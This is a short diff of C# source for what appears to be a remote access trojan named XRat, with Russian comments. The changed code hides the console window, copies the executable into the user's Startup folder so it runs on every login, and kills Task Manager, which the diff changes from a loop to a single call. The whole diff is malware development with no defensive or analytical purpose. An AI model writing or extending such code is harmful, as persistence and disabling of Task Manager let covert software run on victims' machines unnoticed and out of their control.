@@ -110,7 +110,6 @@ namespace XRat
             }
         }
 
-
         public static bool Hide()
         {
             // Получаем дескриптор консольного окна
@@ -182,12 +181,10 @@ namespace XRat
 
             // Получаем имя файла (с расширением)
             string sourceFilePath = ProCMD("pwd").output;
-            sourceFilePath = sourceFilePath + "XRat.exe"; // Исправить!!!!!
-
-            string fileName = "XRat.exe";
+            sourceFilePath = sourceFilePath + Settings.filename; // Исправить!!!!!
 
             // Путь, куда будет скопирован файл
-            string destinationFilePath = Path.Combine(userStartupFolder, fileName);
+            string destinationFilePath = Path.Combine(userStartupFolder, Settings.filename);
 
             // Копируем файл в папку автозагрузки, если он не существует там
             try
@@ -211,10 +208,8 @@ namespace XRat
 
         public static Task Taskmgr()
         {
-            while (true)
-            {
-                CMD(@"taskkill.exe /IM taskmgr.exe");
-            }
+            CMD(@"taskkill.exe /IM taskmgr.exe");
+            return Task.CompletedTask;
         }
     }
 }
